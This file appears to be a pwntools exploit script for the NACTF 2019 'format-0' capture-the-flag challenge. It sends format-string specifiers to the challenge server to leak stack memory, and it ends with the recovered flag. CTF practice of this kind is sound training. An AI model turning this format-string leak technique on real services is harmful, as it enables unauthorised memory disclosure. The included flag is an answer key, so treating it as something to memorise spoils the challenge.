#!/usr/bin/python2
#-*-coding:utf-8-*-
from pwn import *
from PwnContext import *
from time import time
try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
# context.log_level = 'debug'
# functions for quick script
s       = lambda data               :ctx.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data))
sl      = lambda data               :ctx.sendline(str(data))
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, ''))
uu64    = lambda data   :u64(data.ljust(8, ''))

ctx.binary = './format-0'
#ctx.remote_libc = './libc.so'
ctx.remote = ('shell.2019.nactf.com',31782)
#ctx.debug_remote_libc = False # True for debugging remote libc, false for local.
ctx.breakpoints = [0x08049284,0x080491D7]

for i in range(31,45):
    rs('remote')
    sl('%{}$x'.format(i))
    print('num',i,' ',r())
    sleep(1)
    ctx.close()
# dbg()
# rs('remote') # uncomment this for exploiting remote target
irt()

# }964f50Mn_d43r_yr0m3m_k43L_Ftn1rP{ftcan

# nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}
